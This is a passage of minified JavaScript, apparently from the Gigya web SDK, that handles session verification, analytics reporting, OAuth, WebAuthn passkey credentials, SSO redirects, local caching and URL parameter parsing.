              return u = window.gigya.logger.group("hasSession"), l = (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.APIKey) || (null === (n = window.gigya.thisScript) || void 0 === n ? void 0 : n.APIKey), window.gigya.logger.info("checking session exist for apiKey: " + l), (null === (a = window.gigya.thisScript) || void 0 === a ? void 0 : a.APIKey) !== l && window.gigya.logger.info("effective apiKey for checking session and the apiKey that the script was loaded with are different"), (d = o.get()) || !window.gigya.partnerSettings.ssoKey ? [3, 2] : (window.gigya.logger.info("SSO group, sync login token from group"), [4, c(l)]);
            case 1:
              d = i.sent(), i.label = 2;
            case 2:
              return d ? r.sessionData.isSessionVerified(d) ? (window.gigya.logger.info("login token exist and session is already verified, session is valid"), u.end(), [2, !0]) : [3, 3] : [3, 6];
            case 3:
              return window.gigya.logger.info("login token exist and session is not verified, verifying session..."), [4, s.promisify(window.gigya.accounts.verifyLogin)];
            case 4:
              return g = i.sent(), f = 0 == (null == g ? void 0 : g.errorCode), r.sessionData.setIsSessionVerified(d, f), window.gigya.logger.info(f ? "session verified" : "session is not verified"), u.end(), [2, f];
            case 5:
              return [3, 7];
            case 6:
              return (p = window.gigya.utils.URL.getParamsFromURL(document.location.href)).errorCode && p.regToken ? (window.gigya.logger.info("user is returned from redirect, wait for login completion"), u.end(), [2, new gigya.Promise(function (e) {
                window.gigya.accounts.addEventHandlers({
                  onLogin: function () {
                    return e(!0);
                  }
                });
              })]) : (window.gigya.logger.info("login token doesn't exist"), u.end(), [2, !1]);
            case 7:
              return [2];
          }
        });
      });
    }, t.syncGroupToken = c;
  },,,,,,,,,,,,,, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4);
    function o(e, n, o, r, s, c, u) {
      void 0 === c && (c = {}), void 0 === u && (u = !1);
      var l = i.removeUndefined({
        name: e,
        time: new Date().getTime().toString(),
        source: r,
        sourceData: s,
        reportData: c,
        cid: o
      });
      if (u) {
        var d = [l];
        window.gigya.gscounters.sendReport({
          reports: d,
          noAuth: !a(d)
        });
      } else t.queue || (t.queue = []), t.queue.push(l);
    }
    function r() {
      for (; t.queue && t.queue.length > 0;) {
        var e = i.clone(t.queue.splice(0, 5), !0, !0);
        window.gigya.gscounters.sendReport({
          reports: e,
          noAuth: !a(e)
        });
      }
    }
    function a(e) {
      for (var t = 0; t < e.length; t++) {
        var n = e[t];
        if ("loadc" !== n.name && "load" !== n.name || "loadc" === n.name && n.reportData && n.reportData.actionCounterPath) return !0;
      }
      return !1;
    }
    t.trackAddressBarShares = function () {
      if (window.gigya.thisScript.globalConf.trackAddressBarShares) {
        var e = window.gigya._.apiAdapter.getTokenParam(window.gigya.thisScript.APIKey, "UUID"),
          t = document.location.href.split("#");
        1 != t.length && "" != t[1] && "guid=_" != t[1] || document.location.replace("#guid=" + (e || "_"));
      }
    }, t.report = o, t.init = function () {
      setInterval(r, 5e3);
    }, t.reportLoad = function (e, t) {
      if (!t._reportedLoad) {
        t._reportedLoad = !0;
        var n = "load";
        if ("gigya.socialize.plugins.reactions.showReactionsBarUI" == e) return;
        "gigya.socialize.plugins.simpleshare.showSimpleShareUI" == e && (n = "loadSimple"), o(n, t.APIKey, t.cid, t.source, t.sourceData);
      }
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(32);
    t.isLoaded = function () {
      return null != t.initializedTime;
    }, t.load = function () {
      var e = this;
      if (!t.initializedTime && window.gigya.providersConfig.googlePlus) {
        t.initializedTime = null;
        var n = document.createElement("script");
        n.type = "text/javascript", n.async = !0, window.__gigya_handleClientLoad = function () {
          return e.handleClientLoad();
        }, n.src = "https://apis.google.com/js/client.js?onload=__gigya_handleClientLoad";
        var i = document.getElementsByTagName("script")[0];
        i.parentNode.insertBefore(n, i);
      }
    }, t.handleClientLoad = function () {
      try {
        delete window.__gigya_handleClientLoad;
      } catch (e) {
        window.__gigya_handleClientLoad = void 0;
      }
      t.initializedTime = new Date(), i.dispatch({
        eventName: "googlePlusLoaded"
      });
    }, t.refreshSession = function () {}, t.autoLogin = function () {
      window.gigya.socialize.waitForService({
        service: "googlePlus",
        callback: function () {
          window.gigya._.apiAdapter.isSessionValid(window.gigya.thisScript.globalConf, function (e) {
            e || gapi.auth.authorize({
              client_id: window.gigya.providersConfig.googlePlus.clientId,
              scope: window.gigya.providersConfig.googlePlus.scopes,
              immediate: !0,
              response_type: "token"
            }, function (e) {
              e && e.access_token && !window.gigya._.autoLoginInProgress && (window.gigya._.autoLoginInProgress = !0, window.gigya.socialize.notifyLogin({
                regSource: "autoLogin",
                providerSessions: {
                  googlePlus: {
                    authToken: e.access_token
                  }
                }
              }));
            });
          });
        }
      });
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(9);
    t.DefaultGrantType = "authorization_code", t.Oauth_Response_Type = "code", t.OauthMethods = {
      Token: "oauth.token",
      Authorize: "oauth.authorize",
      Connect: "oauth.connect"
    };
    var r = function () {
      function e() {}
      return e.prototype.connect = function (e, n, r) {
        return void 0 === r && (r = !1), i.__awaiter(this, void 0, void 0, function () {
          var a;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return window.gigya._.apiAdapters.web.tokenStore.setBearerToken(e), [4, o.callAsync(t.OauthMethods.Connect, {
                  regToken: n,
                  ignoreApiQueue: r
                })];
              case 1:
                return a = i.sent(), window.gigya._.apiAdapters.web.tokenStore.removeBearerToken(), [2, a];
            }
          });
        });
      }, e.prototype.authorize = function (e) {
        return i.__awaiter(this, void 0, void 0, function () {
          var n;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return window.gigya._.apiAdapters.web.tokenStore.setBearerToken(e), [4, o.callAsync(t.OauthMethods.Authorize, {
                  response_type: t.Oauth_Response_Type
                })];
              case 1:
                return n = i.sent(), window.gigya._.apiAdapters.web.tokenStore.removeBearerToken(), [2, n];
            }
          });
        });
      }, e.prototype.token = function (e, n, i, r) {
        return void 0 === n && (n = !1), void 0 === i && (i = "0"), void 0 === r && (r = t.DefaultGrantType), o.callAsync(t.OauthMethods.Token, {
          grant_type: r,
          sessionExpiration: i,
          code: e,
          dontHandleScreenSet: n
        });
      }, e;
    }();
    t.OauthService = r, t.default = new r();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(116);
    t.errorMap = {
      ConstraintError: {
        errorCode: 400096,
        errorDetails: "Discoverable credentials were required but no available authenticator supported"
      },
      InvalidStateError: {
        errorCode: 400130,
        errorDetails: "The authenticator was previously registered"
      },
      NotAllowedError: {
        errorCode: 200001,
        errorDetails: "User clicked cancel, or the registration ceremony timed out"
      },
      NotSupportedError: {
        errorCode: 400096,
        errorDetails: "No available authenticator supported any of the specified pubKeyCredParams algorithms"
      },
      SecurityError: {
        errorCode: 403045,
        errorDetails: "Hostname is an invalid domain / The RP ID is invalid for this domain"
      },
      TypeError: {
        errorCode: 403045,
        errorDetails: "User ID was not between 1 and 64 characters"
      },
      AbortError: {
        errorCode: 400131,
        errorDetails: "Authentication ceremony was sent an abort signal"
      },
      UnknownError: {
        errorCode: 500131,
        errorDetails: "The authenticator was unable to process the specified options, or could not create a new credential"
      },
      CredentialError: {
        errorCode: 500131,
        errorDetails: "Unable to create/get credential"
      }
    };
    var r = function () {
      function e() {
        this.abortService = new a();
      }
      return Object.defineProperty(e.prototype, "credentials", {
        get: function () {
          return window.gigya._.WindowProvider.navigator().credentials;
        },
        enumerable: !0,
        configurable: !0
      }), e.prototype.isConditionalMediationAvailable = function (e) {
        return void 0 === e && (e = PublicKeyCredential), i.__awaiter(this, void 0, void 0, function () {
          return i.__generator(this, function (t) {
            switch (t.label) {
              case 0:
                return "function" != typeof e.isConditionalMediationAvailable ? [3, 2] : [4, null == e ? void 0 : e.isConditionalMediationAvailable()];
              case 1:
                return [2, t.sent()];
              case 2:
                return [2, !1];
            }
          });
        });
      }, e.prototype.isSupported = function () {
        var e, t;
        return !("object" != typeof this.credentials || "function" != typeof (null === (e = this.credentials) || void 0 === e ? void 0 : e.create) || "function" != typeof (null === (t = this.credentials) || void 0 === t ? void 0 : t.get));
      }, e.prototype.get = function (e, n) {
        return void 0 === n && (n = void 0), i.__awaiter(this, void 0, void 0, function () {
          var r, a, s, c, u, l, d, g, f;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return r = this.createPKCredentialRequest(e), a = this.abortService.createNewAbortSignal(), (s = "conditional" === n) ? [4, this.isConditionalMediationAvailable()] : [3, 2];
              case 1:
                s = !i.sent(), i.label = 2;
              case 2:
                s && (n = void 0), i.label = 3;
              case 3:
                return i.trys.push([3, 5,, 6]), [4, this.credentials.get({
                  mediation: n,
                  publicKey: r,
                  signal: a
                })];
              case 4:
                return c = i.sent(), [3, 6];
              case 5:
                throw u = i.sent(), t.errorMap[null == u ? void 0 : u.name] || t.errorMap.UnknownError;
              case 6:
                if (!c) throw t.errorMap.CredentialError;
                return l = c.id, d = c.rawId, g = c.response, f = c.type, [2, {
                  id: l,
                  type: f,
                  rawId: o.bufferToBase64URLString(d),
                  extensions: c.getClientExtensionResults(),
                  response: {
                    authenticatorData: o.bufferToBase64URLString(g.authenticatorData),
                    clientDataJSON: o.bufferToBase64URLString(g.clientDataJSON),
                    signature: o.bufferToBase64URLString(g.signature),
                    userHandle: null
                  }
                }];
            }
          });
        });
      }, e.prototype.create = function (e) {
        var n;
        return i.__awaiter(this, void 0, void 0, function () {
          var r, a, s, c, u, l, d, g, f;
          return i.__generator(this, function (p) {
            switch (p.label) {
              case 0:
                r = this.createPKCredentialCreate(e), a = this.abortService.createNewAbortSignal(), p.label = 1;
              case 1:
                return p.trys.push([1, 3,, 4]), [4, this.credentials.create({
                  signal: a,
                  publicKey: r
                })];
              case 2:
                return s = p.sent(), [3, 4];
              case 3:
                throw c = p.sent(), t.errorMap[null == c ? void 0 : c.name] || t.errorMap.UnknownError;
              case 4:
                if (!s) throw t.errorMap.CredentialError;
                return u = s.id, l = s.rawId, d = s.response, g = s.type, f = void 0, "function" == typeof d.getTransports && (f = d.getTransports()), [2, {
                  id: u,
                  type: g,
                  rawId: o.bufferToBase64URLString(l),
                  response: {
                    attestationObject: o.bufferToBase64URLString(d.attestationObject),
                    clientDataJSON: o.bufferToBase64URLString(d.clientDataJSON),
                    transport: f
                  },
                  clientExtensionResults: s.getClientExtensionResults(),
                  authenticatorSelection: i.__assign(i.__assign({}, e.authenticatorSelection), {
                    authenticatorAttachment: (null === (n = e.authenticatorSelection) || void 0 === n ? void 0 : n.authenticatorAttachment) || void 0
                  }),
                  attestation: e.attestation || "direct"
                }];
            }
          });
        });
      }, e.prototype.abortCurrentCeremony = function () {
        this.abortService.abort();
      }, e.prototype.createPKCredentialRequest = function (e) {
        var t, n;
        return (null === (t = e.allowCredentials) || void 0 === t ? void 0 : t.length) > 0 && (n = e.allowCredentials.map(function (e) {
          return i.__assign(i.__assign({}, e), {
            id: o.base64URLStringToBuffer(e.id)
          });
        })), i.__assign(i.__assign({}, e), {
          challenge: o.base64URLStringToBuffer(e.challenge),
          allowCredentials: n
        });
      }, e.prototype.createPKCredentialCreate = function (e) {
        var t;
        return i.__assign(i.__assign({}, e), {
          challenge: o.base64URLStringToBuffer(e.challenge),
          user: i.__assign(i.__assign({}, e.user), {
            id: o.utf8StringToBuffer(e.user.id)
          }),
          excludeCredentials: null === (t = e.excludeCredentials) || void 0 === t ? void 0 : t.map(function (e) {
            return i.__assign(i.__assign({}, e), {
              id: o.base64URLStringToBuffer(e.id)
            });
          })
        });
      }, e;
    }();
    t.CredentialService = r;
    var a = function () {
      function e() {}
      return e.prototype.createNewAbortSignal = function () {
        this.controller && this.controller.abort();
        var e = new AbortController();
        return this.controller = e, e.signal;
      }, e.prototype.abort = function () {
        var e;
        null === (e = this.controller) || void 0 === e || e.abort(), this.controller = null;
      }, e;
    }();
    t.default = new r();
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.utf8StringToBuffer = function (e) {
      return new TextEncoder().encode(e);
    }, t.bufferToUTF8String = function (e) {
      return new TextDecoder("utf-8").decode(e);
    }, t.bufferToBase64URLString = function (e) {
      for (var t = new Uint8Array(e), n = "", i = 0; i < t.length; i++) n += String.fromCharCode(t[i]);
      return btoa(n).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
    }, t.base64URLStringToBuffer = function (e) {
      for (var t = e.replace(/-/g, "+").replace(/_/g, "/"), n = (4 - t.length % 4) % 4, i = t.padEnd(t.length + n, "="), o = atob(i), r = new ArrayBuffer(o.length), a = new Uint8Array(r), s = 0; s < o.length; s++) a[s] = o.charCodeAt(s);
      return r;
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(24),
      r = n(77),
      a = n(118),
      s = function () {
        function e(e, t, n) {
          void 0 === n && (n = new r.RequestProvider()), this.flow = e, this.params = t, this._requestProvider = n;
        }
        return e.prototype.next = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return [4, this.fetch(e)];
                case 1:
                  return 0 === (null == (t = i.sent()) ? void 0 : t.errorCode) ? (n = a.ActivityLibrary.getActivity(this.flow, t)) && n.run() : t && this.flow.errorHandler(t), [2];
              }
            });
          });
        }, e.prototype.getRequestParams = function () {
          var e = window.gigya.thisScript.APIKey,
            t = o.get(e),
            n = {};
          if (n.APIKey = e, t) {
            var i = o.getGltexpCookie(e);
            null !== i && (n.loginTokenExp = i), n.login_token = t;
          }
          return n.authMode = "cookie", n;
        }, e.prototype.fetch = function (e) {
          return i.__awaiter(this, void 0, void 0, function () {
            var t, n;
            return i.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  t = "https://" + window.gigya._.getApiDomain("accounts"), i.label = 1;
                case 1:
                  return i.trys.push([1, 3,, 4]), [4, this._requestProvider.send(t, "workflow" + e, this.getRequestParams(), {}, {})];
                case 2:
                  return [2, i.sent()];
                case 3:
                  return n = i.sent(), window.gigya.logger.report("Flow request fail", {
                    url: e,
                    e: n
                  }), [2, null];
                case 4:
                  return [2];
              }
            });
          });
        }, e;
      }();
    t.BaseActivity = s;
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e() {}
      return e.registerActivity = function (e, t) {
        this.activityMap.set(e, t);
      }, e.getActivity = function (e, t) {
        return this.activityMap.has(null == t ? void 0 : t.activityType) ? new (this.activityMap.get(t.activityType))(e, t) : null;
      }, e.activityMap = new Map(), e;
    }();
    t.ActivityLibrary = n;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i,
      o = n(5),
      r = n(17),
      a = n(2);
    try {
      i = Boolean(window.localStorage);
    } catch (e) {
      i = !1;
    }
    function s(e, t) {
      if (i) {
        var n;
        try {
          if (n = o.deserialize(window.localStorage.getItem("gigyaCache")), null == t && n[e]) delete n[e];else {
            var s = new Date().getTime();
            n[e] = {
              response: t,
              time: s
            }, e.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - set", {
              key: e,
              value: n[e]
            }, !1, a.FlagService.forceErrorReport);
          }
          window.localStorage.setItem("gigyaCache", o.serialize(n));
        } catch (e) {}
        r.release("cache", "cache_" + e);
      }
    }
    function c(e) {
      s(e, null);
    }
    t.set = s, t.get = function e(t, n) {
      if (void 0 === n && (n = -1), !i) return null;
      try {
        if (r.isActive("cache_" + t)) return r.waitFor("cache_" + t, e, arguments), null;
        var s = window.localStorage.getItem("gigyaCache"),
          u = o.deserialize(s),
          l = u[t];
        if (l) {
          var d = new Date().getTime();
          return n < 0 || n + l.time > d ? l.response : (t.indexOf("gig_oidcContext_") >= 0 && window.gigya.logger.report("oidc storage logs - get", {
            key: t,
            value: u[t],
            cacheTime: l.time,
            currentTime: d
          }, !1, a.FlagService.forceErrorReport), c(t), null);
        }
        if (!l) return r.hold("cache", "cache_" + t), null;
      } catch (e) {}
      return null;
    }, t.remove = c;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(24),
      r = n(98),
      a = n(49),
      s = n(17),
      c = n(11),
      u = n(121);
    function l() {
      var e, t;
      return window.gigya.partnerSettings.ssoKey ? !!(null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.storageDomainOverride) || (window.gigya.logger.warn("Central login page must configure storageDomainOverride in webSDK Configuration"), !1) : (window.gigya.logger.warn("Not in SSO Group"), !1);
    }
    t.ssoLogin = function (e) {
      void 0 === e && (e = {}), l() && (window.gigya.utils.toggles.isOn("keepSessionOnSSOLogin") || o.remove(), window.gigya.accounts.sso.login(e));
    }, t.continueSso = function (e) {
      var t, n, c, u, d;
      return void 0 === e && (e = {}), i.__awaiter(this, void 0, void 0, function () {
        var g, f, p, h, v, y, w, m;
        return i.__generator(this, function (_) {
          switch (_.label) {
            case 0:
              return s.hold("ssoContinue", "API"), g = window.gigya.logger.group("sso.continue"), f = function (e) {
                return e && window.gigya.logger.warn(e), s.release("ssoContinue", "API"), g.end();
              }, l() ? (p = window.gigya.getUrlParam("ssoToken"), h = window.gigya.getUrlParam("scope"), p ? (v = (null === (n = null === (t = window.gigya.thisScript) || void 0 === t ? void 0 : t.globalConf) || void 0 === n ? void 0 : n.APIKey) || (null === (c = window.gigya.thisScript) || void 0 === c ? void 0 : c.APIKey), (w = o.get(v)) ? [3, 2] : [4, r.syncGroupToken(v)]) : [2, f("ssoToken must be present in the url")]) : [2, f()];
            case 1:
              w = _.sent(), _.label = 2;
            case 2:
              return (y = w) ? (e.sdk = "js_" + ((null === (u = window.gigya.build) || void 0 === u ? void 0 : u.version) || ""), e.sdkBuild = (null === (d = window.gigya.build) || void 0 === d ? void 0 : d.number) || 0, g.end(), "device_sso" === h ? (m = i.__assign({
                context: p,
                login_token: y
              }, e), window.gigya.logger.info("redirect to oidc continue with params: ", m), window.gigya.fidm.oidc.op.redirectToContinue(i.__assign({
                opKey: window.gigya.partnerSettings.ssoKey
              }, m))) : (m = {
                ssoToken: p,
                login_token: y,
                APIKey: v
              }, window.gigya.logger.info("redirect to sso.continue with params: ", m), a.redirect("https://" + window.gigya._.getApiDomain() + "/accounts.sso.continue", [m, e], "POST")), [2]) : [2, f("can't continue with SSO login, missing local session")];
          }
        });
      });
    }, t.getSsoContext = function (e) {
      var t;
      null == e || e.callback((null === (t = window.gigya._.sso) || void 0 === t ? void 0 : t.context) || {});
    }, t.setSsoContext = function (e) {
      try {
        var t = new u.default().getGigParamsFromURL().removeUnacceptableParams(new RegExp(c.GIGYA_INTERNAL_PARAM_PREFIX + "|" + c.GIGYA_INTERNAL_PARAMS + "|gig_ssoToken")).removePrefix().toObject(),
          n = (null == e ? void 0 : e.rpContext) ? JSON.parse(e.rpContext) : {};
        window.gigya._.sso.context = i.__assign(i.__assign({}, t), n);
      } catch (e) {
        window.gigya.logger.report("failed to set sso context");
      }
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(11),
      o = n(122),
      r = n(10),
      a = function () {
        function e(e) {
          var t = this;
          void 0 === e && (e = window.gigya._.WindowProvider), this._win = e, this.currentParams = [], new URLSearchParams(e.location().search).forEach(function (e, n) {
            var i;
            try {
              i = {
                key: r.URLDecode(n),
                value: r.URLDecode(e)
              };
            } catch (t) {
              i = {
                key: n,
                value: e
              }, window.gigya.logger.report("failed to decode url param", {
                urlParam: i
              });
            }
            t.currentParams.push(i);
          });
        }
        return e.prototype.getGigParamsFromURL = function (e) {
          return void 0 === e && (e = i.GIGYA_PARAM_PREFIX), this.currentParams = this.currentParams.filter(function (t) {
            return 0 === t.key.indexOf(e) && t.key !== e;
          }), this;
        }, e.prototype.removePrefix = function (e) {
          return void 0 === e && (e = i.GIGYA_PARAM_PREFIX), this.currentParams.forEach(function (t) {
            t.key.startsWith(e) && (t.key = t.key.slice(e.length));
          }), this;
        }, e.prototype.keysToLower = function () {
          return this.currentParams.forEach(function (e) {
            e.key = e.key.toLowerCase();
          }), this;
        }, e.prototype.removeUnacceptableParams = function (e) {
          return e ? (this.currentParams = this.currentParams.filter(function (t) {
            return !e.test(t.key);
          }), this) : this;
        }, e.prototype.toObject = function () {
          var e = {};
          return this.currentParams.forEach(function (t) {
            o(e, t.key, t.value);
          }), e;
        }, e;
      }();
    t.default = a;
  }, function (e, t, n) {
    (function (t) {
      var n = /\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,
        i = /^\w*$/,
        o = /^\./,
        r = /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
        a = /\\(\\)?/g,
        s = /^\[object .+?Constructor\]$/,
        c = /^(?:0|[1-9]\d*)$/,
        u = "object" == typeof t && t && t.Object === Object && t,
        l = "object" == typeof self && self && self.Object === Object && self,
        d = u || l || Function("return this")();
      var g,
        f = Array.prototype,
        p = Function.prototype,
        h = Object.prototype,
        v = d["__core-js_shared__"],
        y = (g = /[^.]+$/.exec(v && v.keys && v.keys.IE_PROTO || "")) ? "Symbol(src)_1." + g : "",
        w = p.toString,
        m = h.hasOwnProperty,
        _ = h.toString,
        b = RegExp("^" + w.call(m).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
        S = d.Symbol,
        P = f.splice,
        A = R(d, "Map"),
        I = R(Object, "create"),
        k = S ? S.prototype : void 0,
        C = k ? k.toString : void 0;
      function x(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function O(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function E(e) {
        var t = -1,
          n = e ? e.length : 0;
        for (this.clear(); ++t < n;) {
          var i = e[t];
          this.set(i[0], i[1]);
        }
      }
      function T(e, t, n) {
        var i = e[t];
        m.call(e, t) && K(i, n) && (void 0 !== n || t in e) || (e[t] = n);
      }
      function L(e, t) {
        for (var n = e.length; n--;) if (K(e[n][0], t)) return n;
        return -1;
      }
      function D(e) {
        return !(!G(e) || (t = e, y && y in t)) && (function (e) {
          var t = G(e) ? _.call(e) : "";
          return "[object Function]" == t || "[object GeneratorFunction]" == t;
        }(e) || function (e) {
          var t = !1;
          if (null != e && "function" != typeof e.toString) try {
            t = !!(e + "");
          } catch (e) {}
          return t;
        }(e) ? b : s).test(function (e) {
          if (null != e) {
            try {
              return w.call(e);
            } catch (e) {}
            try {
              return e + "";
            } catch (e) {}
          }
          return "";
        }(e));
        var t;
      }
      function j(e, t, o, r) {
        if (!G(e)) return e;
        for (var a = -1, s = (t = function (e, t) {
            if (B(e)) return !1;
            var o = typeof e;
            if ("number" == o || "symbol" == o || "boolean" == o || null == e || q(e)) return !0;
            return i.test(e) || !n.test(e) || null != t && e in Object(t);
          }(t, e) ? [t] : function (e) {
            return B(e) ? e : N(e);
          }(t)).length, c = s - 1, u = e; null != u && ++a < s;) {
          var l = z(t[a]),
            d = o;
          if (a != c) {
            var g = u[l];
            void 0 === (d = r ? r(g, l, u) : void 0) && (d = G(g) ? g : U(t[a + 1]) ? [] : {});
          }
          T(u, l, d), u = u[l];
        }
        return e;
      }
      function M(e, t) {
        var n,
          i,
          o = e.__data__;
        return ("string" == (i = typeof (n = t)) || "number" == i || "symbol" == i || "boolean" == i ? "__proto__" !== n : null === n) ? o["string" == typeof t ? "string" : "hash"] : o.map;
      }
      function R(e, t) {
        var n = function (e, t) {
          return null == e ? void 0 : e[t];
        }(e, t);
        return D(n) ? n : void 0;
      }
      function U(e, t) {
        return !!(t = null == t ? 9007199254740991 : t) && ("number" == typeof e || c.test(e)) && e > -1 && e % 1 == 0 && e < t;
      }
      x.prototype.clear = function () {
        this.__data__ = I ? I(null) : {};
      }, x.prototype.delete = function (e) {
        return this.has(e) && delete this.__data__[e];
      }, x.prototype.get = function (e) {
        var t = this.__data__;
        if (I) {
          var n = t[e];
          return "__lodash_hash_undefined__" === n ? void 0 : n;
        }
        return m.call(t, e) ? t[e] : void 0;
      }, x.prototype.has = function (e) {
        var t = this.__data__;
        return I ? void 0 !== t[e] : m.call(t, e);
      }, x.prototype.set = function (e, t) {
        return this.__data__[e] = I && void 0 === t ? "__lodash_hash_undefined__" : t, this;
      }, O.prototype.clear = function () {
        this.__data__ = [];
      }, O.prototype.delete = function (e) {
        var t = this.__data__,
          n = L(t, e);
        return !(n < 0) && (n == t.length - 1 ? t.pop() : P.call(t, n, 1), !0);
      }, O.prototype.get = function (e) {
        var t = this.__data__,
          n = L(t, e);
        return n < 0 ? void 0 : t[n][1];
      }, O.prototype.has = function (e) {
        return L(this.__data__, e) > -1;
      }, O.prototype.set = function (e, t) {
        var n = this.__data__,
          i = L(n, e);
        return i < 0 ? n.push([e, t]) : n[i][1] = t, this;
      }, E.prototype.clear = function () {
        this.__data__ = {
          hash: new x(),
          map: new (A || O)(),
          string: new x()
        };
      }, E.prototype.delete = function (e) {
        return M(this, e).delete(e);
      }, E.prototype.get = function (e) {
        return M(this, e).get(e);
      }, E.prototype.has = function (e) {
        return M(this, e).has(e);
      }, E.prototype.set = function (e, t) {
        return M(this, e).set(e, t), this;
      };
      var N = F(function (e) {
        var t;
        e = null == (t = e) ? "" : function (e) {
          if ("string" == typeof e) return e;
          if (q(e)) return C ? C.call(e) : "";
          var t = e + "";
          return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
        }(t);
        var n = [];
        return o.test(e) && n.push(""), e.replace(r, function (e, t, i, o) {
          n.push(i ? o.replace(a, "$1") : t || e);
        }), n;
      });
      function z(e) {
        if ("string" == typeof e || q(e)) return e;
        var t = e + "";
        return "0" == t && 1 / e == -1 / 0 ? "-0" : t;
      }
      function F(e, t) {
        if ("function" != typeof e || t && "function" != typeof t) throw new TypeError("Expected a function");
        var n = function () {
          var i = arguments,
            o = t ? t.apply(this, i) : i[0],
            r = n.cache;
          if (r.has(o)) return r.get(o);
          var a = e.apply(this, i);
          return n.cache = r.set(o, a), a;
        };
        return n.cache = new (F.Cache || E)(), n;
      }
      function K(e, t) {
        return e === t || e != e && t != t;
      }
      F.Cache = E;
      var B = Array.isArray;
      function G(e) {
        var t = typeof e;
        return !!e && ("object" == t || "function" == t);
      }
      function q(e) {
        return "symbol" == typeof e || function (e) {
          return !!e && "object" == typeof e;
        }(e) && "[object Symbol]" == _.call(e);
      }
      e.exports = function (e, t, n) {
        return null == e ? e : j(e, t, n);
      };
    }).call(this, n(23));
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(95),
      r = n(159),
      a = n(17),
      s = function (e) {
        function t(t, n, i, o, r, a) {
          void 0 === o && (o = {}), void 0 === r && (r = {});
          var s = e.call(this, t, o) || this;
          return s.schema = n, s.requiresSession = i, s.settings = o, s.adapterSettings = r, s.altSessionParams = a, r.forceHttps = !0, void 0 === r.requiresSession && (r.requiresSession = function () {
            return i;
          }), s;
        }
        return i.__extends(t, e), t.prototype.run = function (e, t) {
          var n,
            i = this;
          if (null === (n = this.settings.mode) || void 0 === n ? void 0 : n.silent) {
            this.settings.mode.warn && window.gigya.logger.warn("Deprecated Feature: " + this.methodName);
            var o = e.callback;
            "function" == typeof o && o();
          } else {
            var s = function () {
              new r.ServerApiRequest(i, e).start();
            };
            e.ignoreApiQueue ? s() : a.queueForExecution("API", function () {
              s();
            });
          }
        }, t;
      }(o.BaseApi);
    t.ServerApi = s;
  },,,,,,,,,,,,,,,,,,,,,,, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(18),
      o = n(9);
    t._aliases = {};
    var r = function () {
      function e(e, n, i, o, r, a, s) {
        if (this.ID = e, this.displayName = n, this.width = i, this.height = o, this.explicitOnly = a, this.aliases = s, this.arDefaultCapabilities = r.split(","), this.name = n.toLowerCase().split(" ").join("").split("!").join("").split(".").join("").split("+").join("plus"), s) {
          t._aliases || (t._aliases = {});
          for (var c = s.split("|"), u = 0; u < c.length; u++) t._aliases[c[u]] = this.name;
        }
        switch (this.name) {
          case "messenger":
            this.displayName = "Microsoft";
            break;
          case "googleplus":
            this.displayName = "Google";
            break;
          case "customopenid":
            this.displayName = "OpenID";
            break;
          case "paypaloauth":
            this.displayName = "PayPal";
        }
      }
      return e.prototype.toString = function () {
        return this.name;
      }, e;
    }();
    function a(e, n) {
      void 0 === n && (n = t.arProviders);
      for (var i = 0; i < n.length; i++) if (n[i].name.toLowerCase() === e.toLowerCase()) return n[i];
    }
    function s(e) {
      if (null != e) {
        for (var n = e.split(","), i = 0; i < n.length; i++) {
          var o = n[i].replace(/^\s+|\s+$/g, "");
          t._aliases[o] && (n[i] = t._aliases[o]);
        }
        return n.join(",");
      }
    }
    function c(e, n) {
      void 0 === n && (n = t.arProviders);
      for (var i = 0; i < n.length; i++) if (n[i].ID === e) return n[i];
    }
    function u(e, n, i) {
      void 0 === n && (n = ""), void 0 === i && (i = t.arProviders);
      var o = (n = n.toLowerCase()).split(" ").join("").split(".").join("").toLowerCase().split(",");
      o = f(o, i);
      for (var r = 0; r < o.length; r++) for (var a = 0; a < e.length; a++) {
        var s = e[a],
          c = s.name || s.toString();
